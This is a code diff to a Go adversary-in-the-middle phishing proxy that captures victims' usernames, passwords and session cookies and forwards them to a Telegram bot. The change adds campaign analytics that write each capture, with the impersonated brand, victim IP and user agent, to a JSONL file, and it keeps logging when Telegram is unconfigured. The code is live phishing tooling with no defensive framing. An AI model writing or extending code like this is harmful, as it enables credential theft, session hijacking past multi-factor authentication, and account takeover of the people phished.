@@ -8,6 +8,7 @@ import (
 	"bytes"
 	"crypto/tls"
 	"embed"
+	"encoding/json"
 	"fmt"
 	"io"
 	"log"
@@ -166,9 +167,9 @@ func rewriteResponse(resp *http.Response, upstreamHost, ourHost string) {
 
 // notifyCapture sends captured credentials and session cookies to Telegram.
 func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie, capturedCookies []string, upstream string) {
-	if telegramToken == "" || telegramChatID == "" {
+	telegramOk := telegramToken != "" && telegramChatID != ""
+	if !telegramOk {
 		log.Println("[telegram] bot not configured — skipping notification")
-		return
 	}
 
 	// Parse form data from POST body
@@ -194,8 +195,30 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		}
 	}
 
+	// Write analytics event to shared JSONL
+	captureTime := time.Now().UTC().Format(time.RFC3339)
+	campaignCookie, _ := r.Cookie("__campaign")
+	campaignID := ""
+	if campaignCookie != nil {
+		campaignID = campaignCookie.Value
+	}
+	writeEvent(map[string]interface{}{
+		"timestamp":   captureTime,
+		"campaign_id": campaignID,
+		"brand":       getBrand(upstream),
+		"username":    username,
+		"ip":          r.RemoteAddr,
+		"user_agent":  r.UserAgent(),
+		"status":      "success",
+		"source":      "proxy",
+	})
+
+	if !telegramOk {
+		return
+	}
+
 	// Build Telegram message
-	captureTime := time.Now().UTC().Format("2006-01-02 15:04:05 MST")
+	captureTimeDisplay := time.Now().UTC().Format("2006-01-02 15:04:05 MST")
 	ip := r.RemoteAddr
 	ua := r.UserAgent()
 
@@ -209,7 +232,7 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		getBrand(upstream), username,
 		username, password,
 		ip, ua,
-		captureTime, upstream)
+		captureTimeDisplay, upstream)
 
 	// Send message
 	sendTelegramMessage(msg)
@@ -218,7 +241,7 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 	if len(capturedCookies) > 0 || len(victimCookies) > 0 {
 		txtContent := fmt.Sprintf("=== AiTM Session Capture ===\n"+
 			"Target: %s\nUsername: %s\nIP: %s\nTime: %s\n\n--- Session Cookies ---\n",
-			upstream, username, ip, captureTime)
+			upstream, username, ip, captureTimeDisplay)
 
 		for _, c := range capturedCookies {
 			txtContent += c + "\n"
@@ -315,4 +338,21 @@ func sendTelegramDocument(caption, filename string, content []byte) {
 	}
 	resp.Body.Close()
 	log.Printf("[telegram] document sent: %s", filename)
+}
+
+func writeEvent(ev map[string]interface{}) {
+	raw, err := json.Marshal(ev)
+	if err != nil {
+		log.Printf("[jsonl] marshal error: %v", err)
+		return
+	}
+	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Printf("[jsonl] open error: %v", err)
+		return
+	}
+	defer f.Close()
+	if _, err := f.Write(append(raw, '\n')); err != nil {
+		log.Printf("[jsonl] write error: %v", err)
+	}
 }
